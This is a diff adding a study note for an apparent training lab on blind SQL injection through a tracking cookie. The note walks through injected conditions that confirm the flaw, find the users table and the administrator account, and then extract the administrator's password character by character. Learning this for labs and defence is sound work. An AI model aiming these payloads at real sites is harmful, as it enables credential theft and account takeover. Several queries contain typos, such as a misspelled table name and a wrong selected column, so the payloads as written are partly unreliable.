@@ -1,0 +1,38 @@
+SQLi - Blind SQL injection with conditional response
+
+Vulnerable parameter - tracking cookies
+
+End goal: 
+- Find password of administrator 
+- Log in as administrator
+
+Analysis:
+
+1. Confirm that the parameter is vulnerable to blind SQLi
+
+select tracking-id from tracking-table where trackingId='...'--
+
+=> If this tracking id exist => query returns values => Welcome back message
+=> If the tracking id dowsn't exist => query returns nothing => No welcome back message
+
+select tracking-id from tracking table where trackingId='...' and 1=1--
+=> True => Welcome back
+
+select tracking-id from tracking table where trackingId='...' and 1=0--
+=> False => No welcome back
+
+2. Confirm that we have users table
+
+select tracking-id from tracking-table where trackingId='...' and (select 'x' from useres LIMIT 1) = 'x'--
+=> users table exits in the database
+
+3. Confirm that username administrator exists in users table
+
+select tracking-id from tracking-table where trackingId='...' and (select username from users where username='administrator')--
+=> administrator exits
+
+4. Enumerate the password of the administrator user
+
+select tracking-id from tracking-table where trackingId='...' and (select users from users where username='administrator' and LENGTH(password)>21)='administrator'--
+
+select tracking-id from tracking-table where trackingId='...' and (select substring(password, 2, 1) from users where username='administrator') = '$a$'--
